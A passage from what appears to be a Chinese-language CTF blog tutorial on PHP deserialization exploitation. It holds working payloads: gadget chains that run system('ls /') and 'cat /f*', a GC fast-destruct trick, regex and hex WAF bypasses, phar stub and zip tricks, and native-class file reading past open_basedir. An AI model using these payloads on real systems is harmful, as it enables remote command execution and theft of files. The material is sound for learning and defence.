class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">errorr1</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;err = <span class="keyword">new</span> <span class="title function_ invoke__">errorr2</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr0</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是 如果没有这句**throw new Exception();<strong>就真的构造完了，但是有的话</strong>__destruct()<strong>是不会执行的，而</strong>__destruct()**不执行这条链子根本就是堵死的，没啥用</p><p>根据之前说的<strong>GC回收机制</strong>可以把一段数据当做垃圾回收，那不就可以执行**__destruct()<strong>，然后就有一个问题——-如何触发</strong>GC回收机制**？！！还记得，之前举过的例子吗？如过没有如何东西指向一个对象，那个对象就会被当作垃圾回收。所以，我们先看修改后的exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr0</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">errorr1</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;err = <span class="keyword">new</span> <span class="title function_ invoke__">errorr2</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$err</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr0</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$a</span>,<span class="number">1</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显</p><p>就加了一行代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$c = array(0=&gt;$a,1=&gt;NULL);</span><br><span class="line"></span><br><span class="line">$c = array(0=&gt;$a,1=&gt;0);  然后再改一下 如下 也可以</span><br></pre></td></tr></table></figure><p>把目标对象赋给键为0，键为1赋值为<strong>NULL</strong>。为什么要这么做，因为这样操作后，得到的字符串为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:1;N;&#125;</span><br><span class="line"></span><br><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:1;i:0;&#125;  这是结果 但是只有还是不行  还要再改一下</span><br><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:0;i:0;&#125;   将1改成0 就可以了 原理是一样的</span><br></pre></td></tr></table></figure><blockquote><p>第一个a为数组，2为数组中键有两个 i &#x3D; 0以及 i &#x3D; 1</p><p>重点重点重点，虽然有两个键i &#x3D; 0对应的是我们目标对象，i &#x3D; 1是NULL，如果这个时候我们做一件坏事，把i 本应该等于 1修改为 i &#x3D; 0。那不就是把i &#x3D; 0指向NULL了吗？然后就实现了GC回收。</p></blockquote><p>所以最后我们修改后的字符串为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:0;O:7:&quot;errorr0&quot;:1:&#123;s:3:&quot;num&quot;;O:7:&quot;errorr1&quot;:1:&#123;s:3:&quot;err&quot;;O:7:&quot;errorr2&quot;:1:&#123;s:3:&quot;err&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;i:0;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630ea11df.png" alt="image-20240312202655182"></p><p>成功</p><p>GC回收机制的利用需要修改字符串中的数据，如果phar反序列化+GC的话就还需要额外修改phar文件的签名，如果遇到的话就需要在修改序列化字符串后再对其进行加密得到的数据替换原本的签名。</p><h2 id="bypass绕过"><a href="#bypass绕过" class="headerlink" title="bypass绕过"></a>bypass绕过</h2><h3 id="wakeup绕过-1"><a href="#wakeup绕过-1" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p>见上文</p><h3 id="destruct绕过"><a href="#destruct绕过" class="headerlink" title="__destruct绕过"></a>__destruct绕过</h3><p>见上文 GC强制回收</p><p>快速触发__destruct</p><p>Fast destruct</p><p>1.修改序列化数字元素个数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:2:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a0dd13fd7.png" alt="image-20240205180429122"></p><p>O:5:”Start”:2:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ea1d7a.png" alt="image-20240205180917410"></p><p>2.去掉序列化尾部 }</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630e5aba2.png" alt="image-20240205181044938"></p><p>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}</p><p><img src="https://bu.dusays.com/2024/05/13/6641630eda87b.png" alt="image-20240205181123821"></p><p>详见newstar web week4 morefast</p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>如preg_match(‘&#x2F;^O:\d+&#x2F;‘)匹配序列化字符串是否是对象字符串开头</p><ul><li><code>利用加号绕过（注意在url里传参时+要编码为%2B）。</code></li><li><code>利用数组对象绕过，如 serialize(array($a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)。</code></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// 将对象放入数组绕过 serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><p>见上文</p><h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><p>序列字符串中表示字符类型的s大写时，会被当成16进制解析</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前，会被waf拦截</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 将小s改为大S; 做处理后 \75是u的16进制， 成功绕过</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="phar的绕过"><a href="#phar的绕过" class="headerlink" title="phar的绕过"></a>phar的绕过</h3><p>当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2:&#x2F;&#x2F;和compress.zlib:&#x2F;&#x2F;等绕过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br></pre></td></tr></table></figure><p>也可以利用其他协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure><p>GIF格式验证可以通过在文件头部添加GIF89a绕过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> $phar-&gt;setStub(“GIF89a”.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">//生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure><p>过滤了__HALT_COMPILER()</p><p>1.<strong>将phar文件进行gzip压缩</strong> ，使用压缩后phar文件同样也能反序列化 (常用)</p><p>2.将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$phar_file = serialize($exp);</span><br><span class="line">echo $phar_file;</span><br><span class="line">$zip = new ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(&#x27;1.zip&#x27;,ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFromString(&#x27;crispr.txt&#x27;, &#x27;file content goes here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($phar_file);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure><h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>PHP 原生类指的是 PHP 内置的类，它们可以直接在 PHP 代码中使用且无需安装或导入任何库，相当于代码中的内置方法例如echo ，print等等可以直接调用，但是原生类就是可以就直接php中直接创建的类，我们可以直接调用创建对象，但是这些类中有的会有魔术方法，为此，我们可以创建原生类去利用其中的魔术方法来达到我们反序列化的利用。</p><p>通过代码直接获取原生类和相关魔术方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://bu.dusays.com/2024/05/13/6641631a7f108.png" alt="image-20240312220217278"></p><p>截不完</p><p>不同版本的PHP其中包含的原生类不同，为了使用到较全的php原生类，建议将php的版本调到7.0以上</p><h3 id="常用原生类使用"><a href="#常用原生类使用" class="headerlink" title="常用原生类使用"></a>常用原生类使用</h3><h4 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator()"></a>DirectoryIterator()</h4><p>使用DirectoryIterator()类可以遍历目录下的文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$dir</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="comment">//不加__toString也可以，因为echo可以自动调用</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641631868f6f.png" alt="image-20240313195328587"></p><p>传入.&#x2F;就会查看到当前目录下的文件</p><p>同理使用..&#x2F;可以查看上级目录下的文件</p><p>使用绝对路径亦可以查看服务器指定目录下的文件目录</p><p><img src="https://bu.dusays.com/2024/05/13/6641631a3cfa0.png" alt="image-20240313195050576"></p><p>foreach是遍历目录关键</p><p>没有foreach就只遍历第一个字符</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$dir</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/66416316804ac.png" alt="image-20240313195401536"></p><p>回显.htaccess的.</p><p>也可以使用glob和file协议读取文件内容</p><p>glob:&#x2F;&#x2F;*.php</p><h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>FilesystemIterator是继承于DirectoryIterator的类，两者作用和用法基本相同，区别为FilesystemIterator会显示文件的完整路径，而DirectoryIterator只显示文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">current</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//是$dir不是$f</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个foreach是继承的DirectoryIterator()的魔术方法__toString,</p><p>而第二个foreach是FilesystemIterator的为了达成上一个foreach的效果的魔术方法current()</p><p><img src="https://bu.dusays.com/2024/05/13/6641631ceee8d.png" alt="image-20240313200737925"></p><p>也可以使用glob协议</p><p><strong>在php4.3以后使用了<code>zend_class_unserialize_deny</code>来禁止一些类的反序列化，很不幸的是这两个原生类都在禁止名单当中</strong></p><h4 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;*.php&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前两个类的作用和使用方法类似，不同点在于其行为类似于glob(),可以通过模式匹配来寻找文件路径（前两个需要利用glob:&#x2F;&#x2F;协议才可以模式匹配）</p><p><img src="https://bu.dusays.com/2024/05/13/66416317e49f4.png" alt="image-20240313202150331"></p><h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h4><p>open_basedir限制目录：将PHP所能打开的文件限制在指定目录树，包括文件本身</p><p>使用DirectoryIterator()和FilesystemIterator的glob:&#x2F;&#x2F;协议可以无视open_basedir对目录的限制，可以用来列举出指定目录下的文件，使用GlobIterator也是一样的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;指定目录&#x27;</span>)；</span><br><span class="line"><span class="variable">$dir1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir1</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dir2</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir2</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject()"></a>SplFileObject()</h4><p>利用SplFileObject()进行文件内容的读取</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641631513ab3.png" alt="image-20240313200156343"></p><p>php文件要到源码中查看（ctrl U）</p><p>同理 没有foeach则只回显一行</p><p>绝对路径也可</p><p>也可：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$k</span> -&gt;<span class="variable">$line</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">key</span>()+<span class="number">1</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">current</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive()"></a>ZipArchive()</h4><p>利用ZipArchive()进行文件删除</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span 